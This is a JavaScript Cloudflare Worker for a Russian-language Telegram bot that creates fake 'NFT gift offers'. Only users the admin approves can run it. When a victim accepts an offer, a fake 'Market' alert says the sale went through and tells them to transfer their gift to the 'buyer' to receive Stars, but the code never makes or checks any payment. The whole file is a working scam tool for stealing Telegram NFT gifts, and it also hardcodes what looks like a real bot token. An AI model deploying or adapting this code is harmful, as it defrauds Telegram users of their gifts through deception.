const ADMIN_ID = 5151757168;
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew";

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();
      const kv = env.USERS_KV;

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (username && kv) await kv.put(`username:${username.toLowerCase()}`, userId.toString());

        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = "🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>" + userId + "</code>";
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Доступ открыт</b>\n🆔 <b>ID:</b> <code>${userId}</code>\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/PlushPepe-2687 9000 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- /add ---
      if (update.message && update.message.text.startsWith("/add ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.put(`user:${foundId}`, "true");
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Попросите <b>@${uname}</b> нажать /start в боте, а затем повторите.`, parse_mode: "HTML" });
            }
          } else {
            await kv.put(`user:${target}`, "true");
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
          }
        }
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        const parts = iq.query.split(" ");
        if (parts.length >= 3) {
          const giftLink = parts[0];
          const amount = parts[1];
          const currency = parts[2];

          let senderName = iq.from.first_name || "";
          if (iq.from.last_name) senderName += " " + iq.from.last_name;
          if (!senderName && iq.from.username) senderName = "@" + iq.from.username;

          // Генерируем короткий ID для офера и сохраняем данные в KV (живет 1 день)
          const offerId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
          if (kv) {
            await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName }), { expirationTtl: 86400 });
          }

          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\nПредложение действительно 5 ч. 59 мин.`;

          const results = [{
            type: "article",
            id: "1",
            title: `Оффер от ${senderName}`,
            description: `За ${amount} ${currency}`,
            input_message_content: { message_text: text, parse_mode: "HTML" },
            reply_markup: {
              inline_keyboard: [
                // В кнопку кладем ТОЛЬКО короткий ID (безопасно влезает в лимит 64 байта)
                [{ text: "✅ Принять", callback_data: `acc_${offerId}` }],
                [{ text: "❌ Отклонить", callback_data: `dec_${offerId}` }]
              ]
            }
          }];

          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
        }
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const data = cq.data;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;
        const hasCaption = !!cq.message.caption; // Проверяем, есть ли подпись под медиа

        // ЕСЛИ ПРИНЯТЬ
        if (data.startsWith("acc_")) {
          const offerId = data.replace("acc_", "");
          let offer = { amount: "⭐", senderName: "покупателя" }; // Значения по умолчанию
          
          if (kv) {
            const saved = await kv.get(`offer:${offerId}`);
            if (saved) offer = JSON.parse(saved);
          }

          // 1. Отвечаем Telegram (убирает белый кружок)
          await callApi("answerCallbackQuery", { 
            callback_query_id: cq.id, 
            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
            show_alert: true 
          });

          // 2. Меняем сообщение (через caption, если есть медиа)
          const newMarkup = { 
            inline_keyboard: [
              [{ text: "Передать NFT ↗", url: `https://t.me/${offer.senderName.replace("@", "")}` }]
            ] 
          };
          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐.`;

          try {
            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
            }
          } catch (e) {
            console.error("Ошибка при редактировании сообщения:", e.message);
          }
        } 
        
        // ЕСЛИ ОТКЛОНИТЬ
        else if (data.startsWith("dec_")) {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }); // Убираем кружок

          const newText = `× Оффер отклонён.`;
          const emptyMarkup = { inline_keyboard: [] };

          try {
            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            }
          } catch (e) {
            console.error("Ошибка при редактировании сообщения:", e.message);
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  return response.json();
}